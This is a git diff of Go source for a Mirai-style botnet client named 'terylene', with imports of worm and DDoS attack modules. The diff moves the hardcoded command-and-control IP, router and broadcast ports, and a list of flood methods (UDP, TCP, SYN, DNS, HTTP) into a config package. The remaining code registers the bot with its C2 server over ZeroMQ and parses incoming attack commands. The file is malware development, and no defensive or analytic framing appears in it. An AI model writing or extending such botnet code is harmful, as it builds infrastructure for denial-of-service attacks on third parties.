@@ -4,23 +4,12 @@ import (
 	"fmt"
 	"strconv"
 	"strings"
+	config "terylene/config"
 	system "terylene/mirai/components/system"
 	worm "terylene/mirai/components/worm"
 	attack "terylene/mirai/ddos"
 
 	zmq "github.com/pebbe/zmq4"
-)
-
-const (
-	//config here
-	C2ip          = "0.0.0.0"
-	broadcastport = "5555"
-	routerport    = "5556"
-)
-
-var (
-	//WARNING: these are builtin methods, dont change them
-	methods = []string{"UDP", "TCP", "SYN", "DNS", "HTTP", "UDP-VIP"}
 )
 
 func migration(dealer, subscriber *zmq.Socket, C2ip, rport string) {
@@ -90,7 +79,7 @@ func terylene(subscriber *zmq.Socket, C2ip, bot, bport string) {
 		parts := strings.Split(message, ":")
 		message = parts[1]
 		if strings.Contains(message, "!") {
-			for _, value := range methods {
+			for _, value := range config.Methods {
 				if strings.Contains(message, value) {
 					parts := strings.Fields(message)
 					if len(parts) == 4 {
@@ -142,5 +131,5 @@ func main() {
 	subscriber.SetLinger(0)
 	dealer, _ := zmq.NewSocket(zmq.DEALER)
 	dealer.SetLinger(0)
-	register(dealer, subscriber, C2ip, routerport)
+	register(dealer, subscriber, config.C2ip, config.Routerport)
 }
